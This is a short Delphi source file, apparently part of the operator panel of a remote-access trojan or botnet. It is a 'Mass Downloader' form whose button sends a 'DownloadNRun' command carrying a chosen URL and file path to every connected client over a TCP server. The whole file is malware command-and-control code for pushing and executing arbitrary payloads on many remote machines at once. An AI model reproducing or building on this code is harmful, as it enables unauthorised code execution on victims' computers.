unit UMassDownloaderpas;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls;

type
  TForm6 = class(TForm)
    GroupBox1: TGroupBox;
    Label2: TLabel;
    Label1: TLabel;
    Button1: TButton;
    EdtPath: TEdit;
    EdtUrl: TEdit;
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form6: TForm6;

implementation

{$R *.dfm}

uses UMian;

procedure TForm6.Button1Click(Sender: TObject);
var
Folder,style:string;
begin

form1.TCPServerSendtoall('DownloadNRun|' + EdtUrl.Text + '|'  + EdtPath.Text );
sleep(100);
form6.Close;
end;

end.
